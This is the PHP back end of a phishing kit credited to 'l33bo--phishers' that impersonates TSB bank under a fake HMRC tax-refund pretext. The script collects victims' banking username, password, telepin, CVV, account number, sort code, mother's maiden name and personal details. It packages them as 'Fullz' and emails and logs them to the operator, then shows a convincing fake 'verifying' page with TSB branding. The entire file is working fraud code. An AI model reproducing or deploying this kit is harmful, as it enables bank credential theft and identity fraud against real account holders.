<?php
/*
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
Created by::: l33bo--phishers ::: icq: 695059760 
*/
require "assets/includes/session_protect.php";
require_once("assets/includes/functions.php");
include "../CONTROLS.php";
include("assets/includes/AES.php");
$username = $_POST['username'];
$password = $_POST['password'];
$memo = $_POST['memo'];
$name = $_POST['name'];
$dob = $_POST['dob'];
$email = $_POST['email'];
$telephone = $_POST['telephone'];
$Network = $_POST['Network'];
$address = $_POST['address'];
$postcode = $_POST['postcode'];
$acno = $_POST['acno'];
$sort = $_POST['sort'];
$secode = $_POST['secode'];
$acno = $_POST['acno'];
$sort = $_POST['sort'];
$mmn = $_POST['mmn'];
$telepin = $_POST['telepin'];
$ip = $_SERVER['REMOTE_ADDR'];
$systemInfo = systemInfo($_SERVER['REMOTE_ADDR']);
$from = $From_Address;
$headers = "From:" . $from;
$subj = "Tsb : $ip";
$to = $Your_Email; 
$warnsubj = "Abuse";
$warn = "A user (with ip: $ip) has attempted to send you a completed form containing abusive language. l33bo_Phishers is against abusive form filling and has redirected this user to the official site while blocking the form.";
$bad_words = array('9999','4r5e','5h1t','5hit','a55','anal','anus','ar5e','arrse','arse','ass','ass-fucker','asses','assfucker','assfukka','asshole','assholes','asswhole','a_s_s','b!tch','b00bs','b17ch','b1tch','ballbag','balls','ballsack','bastard','beastial','beastiality','bellend','bestial','bestiality','bi+ch','biatch','bitch','bitcher','bitchers','bitches','bitchin','bitching','bloody','blow job','blowjob','blowjobs','boiolas','bollock','bollok','boner','boob','boobs','booobs','boooobs','booooobs','booooooobs','breasts','buceta','bugger','bum','bunny fucker','butt','butthole','buttmuch','buttplug','c0ck','c0cksucker','carpet muncher','cawk','chink','cipa','cl1t','clit','clitoris','clits','cnut','cock','cock-sucker','cockface','cockhead','cockmunch','cockmuncher','cocks','cocksuck ','cocksucked ','cocksucker','cocksucking','cocksucks ','cocksuka','cocksukka','cok','cokmuncher','coksucka','coon','cox','crap','cum','cummer','cumming','cums','cumshot','cunilingus','cunillingus','cunnilingus','cunt','cuntlick ','cuntlicker ','cuntlicking ','cunts','cyalis','cyberfuc','cyberfuck ','cyberfucked ','cyberfucker','cyberfuckers','cyberfucking ','d1ck','damn','dick','dickhead','dildo','dildos','dink','dinks','dirsa','dlck','dog-fucker','doggin','dogging','donkeyribber','doosh','duche','dyke','ejaculate','ejaculated','ejaculates ','ejaculating ','ejaculatings','ejaculation','ejakulate','f u c k','f u c k e r','f4nny','fag','fagging','faggitt','faggot','faggs','fagot','fagots','fags','fanny','fannyflaps','fannyfucker','fanyy','fatass','fcuk','fcuker','fcuking','feck','fecker','felching','fellate','fellatio','fingerfuck ','fingerfucked ','fingerfucker ','fingerfuckers','fingerfucking ','fingerfucks ','fistfuck','fistfucked ','fistfucker ','fistfuckers ','fistfucking ','fistfuckings ','fistfucks ','flange','fook','fooker','fuck','fucka','fucked','fucker','fuckers','fuckhead','fuckheads','fuckin','fucking','fuckings','fuckingshitmotherfucker','fuckme ','fucks','fuckwhit','fuckwit','fudge packer','fudgepacker','fuk','fuker','fukker','fukkin','fuks','fukwhit','fukwit','fux','fux0r','f_u_c_k','gangbang','gangbanged ','gangbangs ','gaylord','gaysex','goatse','God','god-dam','god-damned','goddamn','goddamned','hardcoresex ','hell','heshe','hoar','hoare','hoer','homo','hore','horniest','horny','hotsex','jack-off ','jackoff','jap','jerk-off ','jism','jiz ','jizm ','jizz','kawk','knob','knobead','knobed','knobend','knobhead','knobjocky','knobjokey','kock','kondum','kondums','kum','kummer','kumming','kums','kunilingus','l3i+ch','l3itch','labia','lmfao','lust','lusting','m0f0','m0fo','m45terbate','ma5terb8','ma5terbate','masochist','master-bate','masterb8','masterbat*','masterbat3','masterbate','masterbation','masterbations','masturbate','mo-fo','mof0','mofo','mothafuck','mothafucka','mothafuckas','mothafuckaz','mothafucked ','mothafucker','mothafuckers','mothafuckin','mothafucking ','mothafuckings','mothafucks','mother fucker','motherfuck','motherfucked','motherfucker','motherfuckers','motherfuckin','motherfucking','motherfuckings','motherfuckka','motherfucks','muff','mutha','muthafecker','muthafuckker','muther','mutherfucker','n1gga','n1gger','nazi','nigg3r','nigg4h','nigga','niggah','niggas','niggaz','nigger','niggers ','nob','nob jokey','nobhead','nobjocky','nobjokey','numbnuts','nutsack','orgasim ','orgasims ','orgasm','orgasms ','p0rn','pawn','pecker','penis','penisfucker','phonesex','phuck','phuk','phuked','phuking','phukked','phukking','phuks','phuq','pigfucker','pimpis','piss','pissed','pisser','pissers','pisses ','pissflaps','pissin ','pissing','pissoff ','poop','porn','porno','pornography','pornos','prick','pricks ','pron','pube','pusse','pussi','pussies','pussy','pussys ','rectum','retard','rimjaw','rimming','s hit','s.o.b.','sadist','schlong','screwing','scroat','scrote','scrotum','semen','sex','sh!+','sh!t','sh1t','shag','shagger','shaggin','shagging','shemale','shi+','shit','shitdick','shite','shited','shitey','shitfuck','shitfull','shithead','shiting','shitings','shits','shitted','shitter','shitters ','shitting','shittings','shitty ','skank','slut','sluts','smegma','smut','snatch','son-of-a-bitch','spac','spunk','s_h_i_t','t1tt1e5','t1tties','teets','teez','testical','testicle','tit','titfuck','tits','titt','tittie5','tittiefucker','titties','tittyfuck','tittywank','titwank','tosser','turd','tw4t','twat','twathead','twatty','twunt','twunter','v14gra','v1gra','vagina','viagra','vulva','w00se','wang','wank','wanker','wanky','whoar','whore','willies','willy','xrated','fuck','fuckoff','fuck off','fucking','nigger','nigerian','Nigerian','scam','cunt','wankers','twats','scammers','shit','wanker','cunt','asshole','arsehole','passwd','sample');
$VictimInfo .= "| IP Address : " . $_SERVER['REMOTE_ADDR'] . " (" . gethostbyaddr($_SERVER['REMOTE_ADDR']) . ")\r\n";
$VictimInfo .= "| Location: " . $systemInfo['city'] . ", " . $systemInfo['region'] . ", " . $systemInfo['country'] . "\r\n";
$VictimInfo .= "| UserAgent : " . $systemInfo['useragent'] . "\r\n";
$VictimInfo .= "| Browser : " . $systemInfo['browser'] . "\r\n";
$VictimInfo .= "| Platform : " . $systemInfo['os'] . "";
$data = "
+ -------------- L33bo Fullz ---------------+
+ ------------------------------------------+
+ Personal Information
| Full name : $name
| Date of birth : $dob
| Address : $address
| Postcode : $postcode
| Phone : $telephone (Network: $Network)
| Email : $email
| MMN : $mmn
+ ------------------------------------------+
+ Account Information (Tsb)
| Username : $username
| Password : $password
| Memorable : $memo
| Telepin : $telepin
| CVV : $secode
| Account Number : $acno 
| Sortcode : $sort
+ ------------------------------------------+
+ Victim Information
$VictimInfo
+ ------------------------------------------+
";
$imputText = $data;
$imputKey = "232BBCD7D47A1192"; 
$blockSize = 256;
$aes = new AES($imputText, $imputKey, $blockSize);
$enc = $aes->encrypt();
$aes->setData($enc);
$dec=$aes->decrypt();
if($Abuse_Filter==1)
{
foreach($bad_words as $bad_word){
    if(stristr($_POST['name'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location: https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CB8QFjAAahUKEwjt_8mEsPTHAhVBLB4KHZvGCXI&url=http%3A%2F%2Fwww.tsb.co.uk%2F&usg=AFQjCNFLUC4YGrYerTgfv8Gakz2vymcKQw"));
    }
	if(stristr($_POST['mmn'], $bad_word) !== false) {
		mail($to,$warnsubj,$warn,$headers);
        exit(header("Location:  https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0CB8QFjAAahUKEwjt_8mEsPTHAhVBLB4KHZvGCXI&url=http%3A%2F%2Fwww.tsb.co.uk%2F&usg=AFQjCNFLUC4YGrYerTgfv8Gakz2vymcKQw"));
    }
}
}
if($Save_Log==1) {
	if($Encrypt==1) {
	$file=fopen("assets/logs/tsb.txt","a");
	fwrite($file,$enc);
	fclose($file);
	}
	else {
	$file=fopen("assets/logs/tsb.txt","a");
	fwrite($file,$data);
	fclose($file);
	}
}	
require "../assets/includes/vpn_check.php";
if($Send_Log==1) {
	if($Encrypt==1) {
	mail($to,$subj,$enc,$headers);	
	}
	else {
	mail($to,$subj,$data,$headers);	
	}
}
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">

<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>Processing</title>   
<link rel="shortcut icon" href="assets/img/fav.ico">
<meta http-equiv="content-language" content="en-gb">
<link href="assets/css/001.css" media="screen, print" type="text/css" rel="stylesheet">
<link href="assets/css/002.css" media="screen, print" type="text/css" rel="stylesheet">
<link href="assets/css/gotjs.css" media="screen" type="text/css" rel="stylesheet">
<script type="text/javascript" src="assets/js/jquery-min.js"></script>
<script type="text/javascript" src="assets/js/scriptsnippet.jspf"></script>
<script type="text/javascript" src="assets/js/global.js"></script>
<script type="text/javascript">DI.themePath="https://online.tsb.co.uk/personal/unauth/assets/VerdeRetail/";</script>
<script type="text/javascript" src="assets/js/custom.js"></script>
<meta http-equiv="refresh" content="5; URL='../Finish.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true'" />

</head>
    <body class="hasJS safari_537" data-browser="safari" data-version="537">
        
        
        <div id="wrapper">
            

<div class="outer">

    <div id="header">
        <ul id="skiplinks"> 
            <li><a id="lnkSkip" name="lnkSkip" href="#">Skip to main content</a></li>
        </ul>
        <div class="clearfix">
            <p id="logo">
                <span><img src="assets/img/logo.png"></span>  
            </p>
            
                
            <div class="secureMsg">
			<p class="msg"><img src="assets/img/top_mes.png" alt="You&#39;re logging into a secure site"></p>
			<p><a class="linkBullet newwin" href="#">How can I tell that this site is secure?</a></p>
			</div>
			<ul class="loggedHeaderLinks">
                            <li class="mobile"><a href="mobile/index.php?&sessionid=<?php echo generateRandomString(110); ?>&securessl=true" class="linkBullet">&Mu;&omicron;bile</a></li>
                            </ul>
        </div>
    </div>
   
</div>
            <div class="pageWrap">
                <div id="page" class="content">
                
                    <div class="primaryWrap">
                    
                        <div class="primary">
                        <div class="panel">
            
            <span id="strBrandName" style="display:none">VERDE</span>
            <span id="strstepno" style="display:none">Step 1</span>
            <span id="strscenarioname" style="display:none">onlineregistration</span>
                    
                
            <div class="navBar clearfix dbtNav">
			<ol class="progressBar">
				<li class="first"><div>Tax Refund</div></li>
				<li class="current last"><div>Complete</div></li>
			</ol>
			</div>
   
   

          
<div class="inner">
<div class="panel">    
<div class="wideMessage"><a id="loadingIcon" name="loadingIcon" href="#"><img src="assets/img/loading.gif"></a><br>
<br>
<h2>Please wait while we check your information</h2>
<br>
<p align="center">It'll only take a few seconds - we're just verifying the details that you've entered.</p>
<p align="center">Please don't refresh this page or close your browser while you're waiting.</p>
<br>
<div class="subPanel">
<p align="center">You will be redirected back to HMRC in order to complete your claim</p>
</div>
</div>
</div>	
</div>
</div>
</div>                      
</div>

<div class="secondary">
<div class="panel">
<div class="accordion ui-accordion ui-widget ui-helper-reset" role="tablist"><div class="part"><h2 class="trigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" role="tab" aria-expanded="false" tabindex="0" title="Contact Us....: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Contact Us....</h2><div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;"><div class="paneInner"><div class="quickContact"><h3>All account related queries</h3>
<p><strong>0345 975 8758</strong></p>
<p>If you need to call us from abroad or prefer not to use our 0345 number, you can also call us on <strong>+44 203 284 1575.</strong></p>
<p>Calls may be monitored and recorded in case we need to check we have carried out your instructions correctly and to help us improve our quality of service.<br><br></p>
<h3>Internet banking queries</h3>
<p>Technical queries about the Internet Banking service</p>
<p>Call us on<strong>&nbsp;0345 835 3844</strong>. We’re open 7am-10pm Mon – Fri, 8am-6pm Sat – Sun.</p>
<p>If you need to call us from abroad you can also call us on<strong>&nbsp;+44 (0) 203 284 1577</strong>.</p></div></div></div></div><div class="part selected"><h2 class="trigger current linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-active ui-corner-top" role="tab" aria-expanded="true" tabindex="0" title="Help &amp; Support: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-s"></span>Help &amp; Support</h2><div class="pane ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom ui-accordion-content-active" role="tabpanel"><div class="paneInner"><span class="showMeMenu"><ul class="quickFAQs ui-accordion ui-widget ui-helper-reset" role="tablist">
			
	
	<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="Which account details should I provide if I have more than one account with TSB?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Which account details should I provide if I have more than one account with TSB?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>It’s really up to you to. Perhaps you should consider using the account that you use most frequently or whose details you can remember best.</p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="Where can I find my sort code and account number?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Where can I find my sort code and account number?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>You can find these details on one of your latest statements or on your cheque book.</p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="Why is it necessary to provide my email address?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Why is it necessary to provide my email address?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>We need it to contact you should any queries arise on your account.</p>
				    </div>
			</li>
<li class="ui-accordion-li-fix"><h3 class="qfaqTrigger linkPointer hasLink ui-accordion-header ui-helper-reset ui-state-default ui-corner-all" tabindex="0" role="tab" aria-expanded="false" title="Where do I find my credit card number?: Use this link to show or hide more information."><span class="ui-icon ui-icon-triangle-1-e"></span>Where do I find my credit card number?</h3>
			<div class="qfaqCont ui-accordion-content ui-helper-reset ui-widget-content ui-corner-bottom" role="tabpanel" style="display: none;">
					<p>It’s the 16 digit number on the front of your credit card. Please enter it without spaces.</p>
				    </div>
			</li>
</ul>
</span>
</div>
</div>
</div>
</div>
<div class="subPanel">
<h3>Our Internet Banking Guarantee</h3>
<p>We guarantee to refund your money in the unlikely event you experience fraud with our Internet Banking service - as long as you've been careful, for example, by taking reasonable steps to keep your security information safe.</p>
</div> 
</div>
</div>
</div>              
</div>
<div id="footer">
<div class="outer">
<div id="footerInner">			
<ul>
<li><a class="newwin" href="#">Legal</a></li>
<li><a class="newwin" href="#">Privacy</a></li>
<li><a class="newwin" href="#">Security</a></li>
<li><a class="newwin" href="#">Rates and Charges</a></li>
</ul>
</div>
</div>
</div>
</div>
</body>
</html>